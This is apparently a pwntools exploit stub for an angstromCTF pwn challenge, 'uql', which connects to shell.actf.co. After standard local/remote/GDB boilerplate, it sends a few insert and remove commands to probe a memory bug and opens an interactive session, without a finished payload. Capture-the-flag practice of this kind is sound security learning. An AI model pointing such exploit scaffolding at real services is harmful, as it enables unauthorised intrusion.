#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
context.terminal = ['kitty', '-e', 'sh', '-c']


exe = context.binary = ELF('./uql')

host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21321)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def send_command(cmd):
    io.sendlineafter("> ", cmd)
    print(cmd)
    print(io.recvline(timeout=1))

io = start()
send_command("insert aaaa;")
send_command("insert bbbb;")
send_command("insert bbbb;")
send_command("insert 1;")
gdb.attach(io)

send_command("remove 1;")
io.interactive()

